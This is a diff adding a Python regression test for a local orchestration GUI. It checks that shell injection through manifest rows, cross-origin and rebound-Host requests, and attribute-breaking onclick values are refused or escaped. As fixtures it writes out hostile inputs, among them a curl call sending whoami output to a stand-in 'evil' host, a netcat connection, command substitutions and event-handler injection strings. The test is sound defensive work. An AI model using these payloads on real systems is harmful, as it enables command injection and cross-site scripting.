@@ -1,0 +1,231 @@
+#!/usr/bin/env python3
+"""
+zorca-gui-test - the :7777 injection cases, no Orca touched.
+
+Imports gui/zorca-gui as a module with ORCA pointed at a stub that only
+records its argv, MANIFEST pointed at a fixture, and the server bound to an
+ephemeral port. The client half runs the page's own <script> under node
+with a stub DOM, then Python's html.parser judges the markup the way a
+browser would - a value that ends a single-quoted onclick early shows up
+as an extra attribute on the element, which is the bug.
+
+Each case is one of the three holes recorded in .handoffs/DONE.md
+2026-08-27 (push-state check): onclick interpolation, manifest --command,
+missing Origin/Host guard.
+"""
+import importlib.util
+import json
+import os
+import subprocess
+import sys
+import tempfile
+import threading
+import time
+import urllib.error
+import urllib.request
+from html.parser import HTMLParser
+
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+GUI = os.path.join(ROOT, "gui", "zorca-gui")
+PASS = FAIL = 0
+
+
+def ok(cond, label, detail=""):
+    global PASS, FAIL
+    if cond:
+        PASS += 1
+        print("  ok   " + label)
+    else:
+        FAIL += 1
+        print("  FAIL " + label + ((" - " + detail) if detail else ""))
+
+
+import importlib.machinery
+spec = importlib.util.spec_from_file_location(
+    "zorca_gui", GUI, loader=importlib.machinery.SourceFileLoader("zorca_gui", GUI))
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+
+S = tempfile.mkdtemp()
+ARGV_LOG = os.path.join(S, "argv.log")
+CANARY = os.path.join(S, "canary")
+stub = os.path.join(S, "fake-orca")
+with open(stub, "w") as f:
+    f.write("#!/bin/bash\n"
+            "printf '%%s\\n' \"$@\" >> \"%s\"\n"
+            "echo '{\"ok\": true}'\n"
+            "echo 'Created terminal term_stub'\n" % ARGV_LOG)
+os.chmod(stub, 0o755)
+mod.ORCA = stub
+
+# ---- 1. manifest rows: nothing from the file may reach a shell -----------
+wt = os.path.join(S, "wt")
+os.mkdir(wt)
+manifest = os.path.join(S, "manifest.md")
+rows = [
+    ("good", "claude --resume abc12345"),
+    ("quoted", 'claude --resume "zaostock"'),
+    ("semi", "claude --resume abc; curl http://evil/$(whoami)"),
+    ("andand", "claude --resume abc12345 && nc evil 1234"),
+    ("touch", "claude --resume $(touch %s)" % CANARY),
+]
+with open(manifest, "w") as f:
+    f.write("| Lane | Worktree | Command |\n|---|---|---|\n")
+    for name, cmd in rows:
+        f.write("| %s | `%s` | `%s` |\n" % (name, wt, cmd))
+mod.MANIFEST = manifest
+lanes = {l["name"]: l for l in mod.load_lanes()}
+print("manifest --command")
+ok(lanes.get("good", {}).get("cmd") == "claude --resume abc12345",
+   "plain session id builds the command", repr(lanes.get("good")))
+ok(lanes.get("quoted", {}).get("cmd") == "claude --resume zaostock",
+   "quoted session NAME accepted, quotes stripped", repr(lanes.get("quoted")))
+for name in ("semi", "andand", "touch"):
+    l = lanes.get(name, {})
+    ok(not l.get("cmd") and l.get("bad"),
+       "hostile row %r refused with a reason" % name, repr(l))
+
+# ---- 2. server: origin guard, token ids, no shell metachar to orca -------
+port = 0
+srv = mod.ThreadingHTTPServer(("127.0.0.1", 0), mod.H)
+port = srv.server_address[1]
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+
+def post(path, body, headers=None):
+    req = urllib.request.Request("http://127.0.0.1:%d%s" % (port, path),
+                                 data=json.dumps(body).encode(), method="POST")
+    for k, v in (headers or {}).items():
+        req.add_header(k, v)
+    try:
+        r = urllib.request.urlopen(req, timeout=10)
+        return r.status
+    except urllib.error.HTTPError as e:
+        return e.code
+
+
+def argv_lines():
+    try:
+        return open(ARGV_LOG).read().splitlines()
+    except FileNotFoundError:
+        return []
+
+
+print("origin / host guard")
+before = len(argv_lines())
+ok(post("/api/focus", {"handle": "term_1"}, {"Origin": "http://evil.example"}) == 403,
+   "cross-origin POST refused 403")
+ok(post("/api/focus", {"handle": "term_1"}, {"Host": "evil.example"}) == 403,
+   "rebound Host refused 403")
+ok(post("/api/focus", {"handle": "term_1"}, {"Origin": "null"}) == 403,
+   "Origin null refused 403")
+ok(len(argv_lines()) == before, "refused requests never reached orca")
+ok(post("/api/focus", {"handle": "term_1"}, {"Origin": "http://127.0.0.1:%d" % port}) == 200,
+   "same-origin POST accepted")
+ok(post("/api/focus", {"handle": "term_2"}) == 200, "no Origin (curl, local script) accepted")
+ok("--terminal=term_2" in argv_lines(), "handle bound with --flag=value", repr(argv_lines()[-3:]))
+
+print("opaque ids")
+before = len(argv_lines())
+ok(post("/api/focus", {"handle": "x; touch " + CANARY}) == 400, "shell-shaped handle refused 400")
+ok(post("/api/resolve", {"id": "gate\"'x", "resolution": "yes"}) == 400, "quote-shaped gate id refused 400")
+ok(post("/api/focus", {"handle": "--json"}) == 400, "flag-shaped handle refused 400")
+ok(len(argv_lines()) == before, "refused ids never reached orca")
+ok(post("/api/resolve", {"id": "gate_1", "resolution": "--json"}) == 200, "resolution beginning with a dash accepted")
+ok("--resolution=--json" in argv_lines(), "resolution bound with --flag=value, not parsed as a flag")
+ok(not os.path.exists(CANARY), "no canary file was ever created")
+
+# ---- 3. client: the page's own script, hostile state, real HTML parser ---
+page = mod.PAGE
+script = page.split("<script>", 1)[1].split("</script>", 1)[0]
+HOSTILE = "x' onmouseover='window.__pwned=1"
+state = {
+    "ts": time.time(), "run": "run_x", "tasks": [], "resolved": [], "lanes": [], "log": [],
+    "gates": [{"id": "gate'\"1", "question": "q?", "created_at": "", "task_id": "t",
+               "options": [HOSTILE, 'say "yes"', "don't merge", "</script><img src=x>"]},
+              {"id": "gate2", "question": "typed?", "created_at": "", "task_id": "t", "options": []}],
+    "panes": [{"handle": "term' onmouseover='window.__pwned=1", "repo": "r", "state": "waiting",
+               "ctx": 10, "rank": 3, "tail": "t"}],
+    "drafts": [{"id": "d' onmouseover='window.__pwned=1", "repo": "r", "reason": "", "text": "hi"}],
+}
+NODE = r"""
+const state = JSON.parse(process.argv[1]);
+const clicks = JSON.parse(process.argv[2] || "null");
+const posted = [];
+function El(){ this._html=""; this.value="typed answer"; this.style={}; }
+Object.defineProperty(El.prototype, "innerHTML", {get(){return this._html;}, set(v){this._html=v;}});
+Object.defineProperty(El.prototype, "textContent", {get(){return this._text;},
+  set(v){ this._text=v; this._html=String(v).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }});
+const els = {};
+global.document = { createElement: () => new El(),
+  getElementById: id => (els[id] = els[id] || new El()) };
+global.fetch = async () => ({ ok: true, json: async () => state });
+global.setInterval = () => {};
+global.setTimeout = () => {};
+global.post = async (url, body) => { posted.push([url, body]); };
+""" + script.replace("async function post(url, body){", "async function post_unused(url, body){") + r"""
+(async () => {
+  await load();
+  if (clicks) {
+    for (const c of clicks) { try { new Function(c)(); } catch (e) { posted.push(["THROW", String(e)]); } }
+    console.log(JSON.stringify(posted));
+  } else {
+    console.log(JSON.stringify({gates: els.gates.innerHTML, panes: els.panes.innerHTML, drafts: els.drafts.innerHTML}));
+  }
+})();
+"""
+
+
+def node(*args):
+    r = subprocess.run(["node", "-e", NODE, "--", json.dumps(state)] + list(args),
+                       capture_output=True, text=True, timeout=30)
+    if r.returncode != 0:
+        print("  node stderr: " + r.stderr.strip()[:400])
+        return None
+    return json.loads(r.stdout.strip().splitlines()[-1])
+
+
+class Attrs(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.tags = []
+
+    def handle_starttag(self, tag, attrs):
+        self.tags.append((tag, dict(attrs)))
+
+
+print("client onclick interpolation (browser-parsed)")
+html = node()
+if html is None:
+    ok(False, "node rendered the page script")
+else:
+    ALLOWED = {"class", "style", "id", "type", "placeholder", "onclick"}
+    onclicks = []
+    for section in ("gates", "panes", "drafts"):
+        p = Attrs()
+        p.feed(html[section])
+        extra = [(t, k) for t, a in p.tags for k in a if k not in ALLOWED]
+        ok(not extra, "%s: no attribute a value could smuggle in" % section, repr(extra)[:200])
+        ok(not any(t == "img" for t, _ in p.tags), "%s: no injected tag" % section)
+        onclicks += [a["onclick"] for t, a in p.tags if "onclick" in a]
+    ok(len(onclicks) == 5 + 2 + 1 + 2, "every button kept its onclick", "%d found" % len(onclicks))
+    posted = node(json.dumps(onclicks))
+    if posted is None:
+        ok(False, "onclick handlers execute")
+    else:
+        bodies = [b for u, b in posted if u != "THROW"]
+        ok(not any(u == "THROW" for u, _ in posted), "no onclick threw", repr(posted)[:300])
+        res = [b.get("resolution") for u, b in posted if u == "/api/resolve"]
+        for o in state["gates"][0]["options"]:
+            ok(o in res, "option round-trips exactly: %r" % o, repr(res)[:300])
+        ok(all(b.get("id") == "gate'\"1" for u, b in posted if u == "/api/resolve" and b.get("resolution") in state["gates"][0]["options"]),
+           "gate id round-trips exactly")
+        ok("typed answer" in res, "typed answer reaches resolve")
+        ok(any(b.get("handle") == state["panes"][0]["handle"] for u, b in posted if u == "/api/focus"),
+           "pane handle round-trips exactly")
+        ok(any(b.get("id") == state["drafts"][0]["id"] for u, b in posted if u == "/api/draft"),
+           "draft id round-trips exactly")
+
+srv.shutdown()
+print("\n%d passed, %d failed" % (PASS, FAIL))
+sys.exit(1 if FAIL else 0)
